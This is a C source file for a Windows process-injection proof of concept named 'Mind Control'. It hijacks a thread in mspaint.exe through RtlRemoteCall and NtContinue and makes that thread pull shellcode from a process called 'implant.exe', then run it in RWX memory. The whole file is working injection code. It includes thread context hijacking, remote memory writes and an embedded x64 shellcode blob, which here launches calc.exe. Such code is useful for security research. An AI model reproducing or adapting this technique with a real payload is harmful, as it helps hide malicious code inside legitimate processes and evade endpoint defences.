/*

 Name: Mind Control
 Description: Proof-of-concept of using RtlRemoteCall to instruct a remote process
			        to perform local shellcode injection.
 Author: KrknSec (@KrknSec)

 Credits: Reenz0h (Created the ApiReeKall technique used)
 Inspiration: zerosum0x0, Dmitry Koder
 
*/

#include "mindcontrol.h"

// True shellcode to inject using this method
unsigned char payload[] = {
	0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
	0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
	0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
	0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
	0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
	0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
	0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
	0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
	0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
	0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
	0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
	0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
	0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
	0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
	0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
	0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
	0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
	0x63,0x2e,0x65,0x78,0x65,0x00
};

//---------------------
// FIND TARGET PROCESS
//---------------------
int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


//----------------
// FIND THREAD ID
//----------------
int FindThreadID(int pid){

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid)  {
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	CloseHandle(Snap);
	
	return tid;
}



//-----------
// SHELLCODE
//-----------
void SHELLCODE(MindControl * mc){
	mc->virtAllocRet = mc->MC_VirtualAlloc(mc->param1, mc->param2, mc->param3, (PDWORD)mc->param4);
	mc->hProc = mc->MC_OpenProcess(mc->dwDesiredAccess, mc->bInheritHandle, mc->dwProcessId);
	mc->MC_ReadProcessMemory(mc->hProc, mc->lpBaseAddress, mc->virtAllocRet, mc->nSize, mc->lpNumberOfBytesRead);
	mc->MC_tHandle = mc->MC_CreateThread(mc->lpThreadAttributes, mc->dwStackSize, (LPTHREAD_START_ROUTINE)mc->virtAllocRet, mc->lpParameter, mc->dwCreationFlags, mc->lpThreadId);
	mc->MC_Sleep(mc->dwMilliseconds);
	mc->MC_CloseHandle(mc->hProc);
	size_t ret = (size_t) mc->MC_VirtualFree(mc->virtAllocRet, mc->param2, mc->dwFreeType);
	mc->retval = ret;
	mc->MC_CloseHandle(mc->MC_tHandle);
	mc->ntContinue(&mc->context, 0);
  //size_t ret = (size_t) mc->MC_EnumUILanguagesW((UILANGUAGE_ENUMPROCW)mc->virtAllocRet, mc->dwFlags, mc->lParam);
	//mc->retval = ret;
}
void SHELLCODE_END(void) {}



//--------------------
// DO THE MINDCONTROL
//--------------------
size_t DoMindControl(HANDLE hProcess, HANDLE hThread, MindControl mc) {
	char prolog[] = { 	0x49, 0x8b, 0xcc,   // mov rcx, r12
						          0x49, 0x8b, 0xd5,	// mov rdx, r13
						          0x4d, 0x8b, 0xc6,	// mov r8, r14
						          0x4d, 0x8b, 0xcf	// mov r9, r15
					};
	int prolog_size = sizeof(prolog);
	

	// resolve needed API pointers
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
	NtContinue_t pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");
	
	if (pRtlRemoteCall == NULL || pNtContinue == NULL) {
		printf("[!] Error resolving native API calls!\n");
		return -1;		
	}
	

	// allocate some space in the target for our shellcode
	void * remote_mem = VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) {
		printf("[!] Error allocating remote memory!\n");
		return -1;
	}
	printf("[+] Allocated memory = 0x%p\n", remote_mem);
	

	// calculate the size of our shellcode function
	size_t sc_size = (size_t) SHELLCODE_END - (size_t) SHELLCODE;
	size_t bOut = 0;
	

#ifdef _WIN64 
	// first, write prolog, if the process is 64-bit
	if (WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T *) &bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (prolog)!\n");
		return -1;
	}
#else
	// otherwise, ignore the prolog
	prolog_size = 0;
#endif


	// write the main payload
	if (WriteProcessMemory(hProcess, (char *) remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (shellcode)!\n");
		return -1;
	}
	
	// set remaining data in ApiReeKall struct - NtContinue with a thread context we're hijacking
	mc.retval = RETVAL_TAG;
	mc.ntContinue = pNtContinue;
	mc.context.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);
	GetThreadContext(hThread, &mc.context);

	// Prep the RtlRemoteCall argument to contain our shellcode
	MindControl * mc_arg;
	mc_arg = (MindControl  *) ((size_t) remote_mem + sc_size + prolog_size + 4);		// align to 0x10
	if (WriteProcessMemory(hProcess, mc_arg, &mc, sizeof(MindControl), 0) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		ResumeThread(hThread);
		printf("[!] Error writing remote memory (MindControl arg)!\n");
		return -1;		
	}
	
	printf("[+] MindControl Arg = %#zx\n", mc_arg);
	
	// All looks good, continue to make RtlRemoteCall
	printf("[+] All set! Press <ENTER> to continue...\n"); 
	
	getchar();
	
	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG) &mc_arg, 1, 1);
	
	printf("[+] RtlRemoteCall executed!\n");
	ResumeThread(hThread);

	// get the remote API call return value
	size_t ret = 0;
	while(TRUE) {
		Sleep(1000);
		ReadProcessMemory(hProcess, mc_arg, &ret, sizeof(size_t), (SIZE_T *) &bOut);
		if (ret != RETVAL_TAG) break;
	}

	
	// Remove the shellcode memory buffer
	if (!VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE))
		printf("[!] Remote shellcode memory (@%p) could not be released (error code = %x)\n", GetLastError());
	
	return 0;
}



//-----------
// MAIN FUNC
//-----------
int main(void){

	// Vars
	PDWORD oldProtect = NULL;


	// get process ID and thread ID of the target
	DWORD pID = FindTarget("mspaint.exe");
	if (pID == 0) {
		printf("[!] Could not find target process! Is it running?\n");
		return -1;		
	}

	DWORD tID = FindThreadID(pID);
	if (tID == 0) {
		printf("[!] Could not find a thread in target process!\n");
		return -1;		
	}
	

	// open both process and thread in the remote target
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, tID);
	if (hProcess == NULL || hThread == NULL) {
		printf("[!] Error opening remote process and thread!\n");
		return -1;		
	}


	// Prep the MindControl struct
	MindControl mc = { 0 };


	// OpenProcess struct setup
	mc.MC_OpenProcess = (OpenProcess_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
	mc.dwDesiredAccess = PROCESS_ALL_ACCESS;
	mc.bInheritHandle = FALSE;
	mc.dwProcessId = FindTarget("implant.exe");


	// VirtualAlloc struct setup
	mc.MC_VirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	mc.virtAllocRet = NULL;
	mc.param1 = NULL;
	mc.param2 = sizeof(payload);	
	mc.param3 = MEM_COMMIT | MEM_RESERVE;
	mc.param4 = PAGE_EXECUTE_READWRITE;


	// ReadProcessMemory setup
	mc.MC_ReadProcessMemory = (ReadProcessMemory_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "ReadProcessMemory");
	mc.lpBaseAddress = (LPVOID)payload;
	mc.nSize = sizeof(payload);
	mc.lpNumberOfBytesRead = NULL;


	// CreateThread setup
	mc.MC_CreateThread = (CreateThread_t)GetProcAddress(LoadLibrary("kernel32.dll"), "CreateThread");
	mc.lpThreadAttributes = NULL;
	mc.dwStackSize = 0;
	mc.lpStartAddress = NULL;
	mc.lpParameter = NULL;
	mc.dwCreationFlags = 0;
	mc.lpThreadId = NULL;
	
	// It also works with Callback Code Execution but this does crash the program
	/*
	mc.MC_EnumUILanguagesW = (EnumUILanguagesW_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "EnumUILanguagesW");
	mc.dwFlags = MUI_LANGUAGE_NAME;
	mc.lParam = NULL;
	*/

	// Sleep setup
	mc.MC_Sleep = (Sleep_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "Sleep");
	mc.dwMilliseconds = 10000;

	// CloseHandle setup
	mc.MC_CloseHandle = (CloseHandle_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "CloseHandle");

	// VirtualFree setup
	mc.MC_VirtualFree = (VirtualFree_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualFree");
	mc.dwFreeType = MEM_DECOMMIT;
	

	// Do the mind control
	size_t ret = DoMindControl(hProcess, hThread, mc);


	// cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
